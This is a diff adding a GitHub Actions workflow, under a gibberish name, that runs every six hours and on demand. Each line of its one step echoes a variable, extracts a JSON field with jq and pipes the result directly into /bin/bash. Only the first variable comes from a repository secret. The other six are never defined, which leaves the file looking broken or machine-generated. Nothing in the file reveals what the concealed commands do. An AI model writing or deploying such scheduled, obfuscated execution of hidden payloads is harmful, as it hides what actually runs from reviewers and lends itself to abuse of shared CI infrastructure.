@@ -1,0 +1,25 @@
+name: laoliuhenong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoliuhenong
+        env:
+          zgxpk644: ${{ secrets.zgxpk644 }}
+        run: |
+          echo $zgxpk644 | jq -r .kfaax8 | /bin/bash
+          echo $re5867 | jq -r .n733 | /bin/bash
+          echo $obdeq5149 | jq -r .n21202 | /bin/bash
+          echo $boau30 | jq -r .abu60 | /bin/bash
+          echo $e28 | jq -r .npbge5240 | /bin/bash
+          echo $uoweb7 | jq -r .srgsb16230 | /bin/bash
+          echo $fme66 | jq -r .kllp201 | /bin/bash
+
